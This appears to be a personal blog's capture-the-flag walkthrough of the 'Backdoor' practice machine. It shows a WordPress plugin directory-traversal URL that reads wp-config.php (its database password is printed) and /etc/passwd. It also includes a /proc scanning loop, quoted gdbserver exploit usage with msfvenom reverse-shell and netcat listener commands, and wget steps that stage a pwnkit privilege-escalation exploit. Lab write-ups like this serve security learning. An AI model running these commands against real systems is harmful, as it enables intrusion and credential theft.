---
layout: post
title: CTF Backdoor
date:   2022-01-29 15:19:25 -0600
categories: CTF
tags: Linux
---
# hosts
```zsh
sudo echo "10.10.11.125 backdoor.htb" >> /etc/hosts
```

# nmap

```zsh
nmap -A -p- 10.10.11.125

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &#8211; Real-Life
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

It's a wordpress website.
# wpscan

```zsh
wpscan --url http://backdoor.htb/
```

# User wb
```zsh
http://backdoor.htb/?author=1
```

# CVE-2016-10924
???

# poc
https://www.exploit-db.com/exploits/39575
# wp-config

http://10.10.11.125:80/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php

# Mysql pass

define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

# /etc/passwd
```zsh
curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\?ebookdownloadurl=/etc/passwd

/etc/passwd/etc/passwd/etc/passwdroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
<script>window.close()</script>% 
```

# Directory traversall blog
https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/

This one gonna help me to exploit the machine.
There is 3 exemples, this one sound good.
/proc/[PID]/cmdline 
```html
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\?ebookdownloadurl=/proc/1/cmdline
```
I don't know how to use burpsuite, I'm gonna create a script.
```bash
i=1
while ((i<1000))
          do
    echo $i
    curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\?ebookdownloadurl=/proc/$i/cmdline >> pid.txt    
    ((i=i+1))
done
```
I forgot it put the \n for each lines but it works.

![](https://i.imgur.com/8eOgm9j.png)
gdbserver
![](https://i.imgur.com/xpEriQq.png)
Ahaha I just need a sheel and I'm root.

# exploit gdb server
https://www.exploit-db.com/exploits/50539

```
help = f'''
Usage: python3 {sys.argv[0]} <gdbserver-ip:port> <path-to-shellcode>

Example:
- Victim's gdbserver   ->  10.10.10.200:1337
- Attacker's listener  ->  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
'''
```
This is what you have to do.
It was hard to connect to the server, I had lot of errors.
I was drooling on my keyboard while i thought about what i could do next.

![](https://i.imgur.com/bZNtp10.png)

And I'm in.
# Exploit pwnkit

This exploit is so good.
We don't have gcc on the target machine so I'm gonna use python.

## Download thee exploit on my computer
```zsh
mkdir exp
cd exp
wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
python2.7 -m SimpleHTTPServer
```
## Download on the target from my computer
```zsh
wget 10.10.14.119:8000/CVE-2021-4034.py
```
## eploit 
```zsh
python3 CVE-2021-4034.py
id
```
![](https://i.imgur.com/sh5vFa7.png)






























